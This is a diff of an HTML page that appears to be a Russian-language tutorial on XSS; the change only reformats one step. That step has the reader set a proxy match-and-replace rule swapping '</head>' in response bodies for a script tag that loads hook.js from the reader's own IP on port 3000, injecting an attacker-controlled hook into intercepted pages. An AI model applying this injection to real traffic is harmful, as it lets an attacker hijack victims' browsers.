@@ -133,11 +133,11 @@ XSS (Cross Site Scripting, получил аббревиатуру XSS, а не 
   <li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ставим тип Response body</li>
   <li>
     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Match: вписывайте
-    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);"><\/head></pre>
+    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">&lt;\/head&gt;</pre>
   </li>
   <li>
-    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Replace вписывайте: 
-    <pre class="html4strict" style="font-family:monospace;"><span style="color: #009900;">&lt;<span style="color: #000000; font-weight: bold;">script</span> <span style="color: #000066;">src</span><span style="color: #66cc66;">=</span>”192.168.0<span style="color: #66cc66;">/</span><span style="color: #cc66cc;">1</span>.x:<span style="color: #cc66cc;">3000</span><span style="color: #66cc66;">/</span>hook.js”&gt;&lt;<span style="color: #66cc66;">/</span><span style="color: #000000; font-weight: bold;">script</span>&gt;&lt;<span style="color: #66cc66;">/</span><span style="color: #000000; font-weight: bold;">head</span>&gt;</span></pre>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Replace вписывайте:
+    <pre>&lt;script src=”192.168.0/1.x:3000/hook.js”&gt;&lt;/script&gt;&lt;/head&gt;</pre>
     где 192.168.0/1.x - ваш IP-адрес
   </li>
   <li>
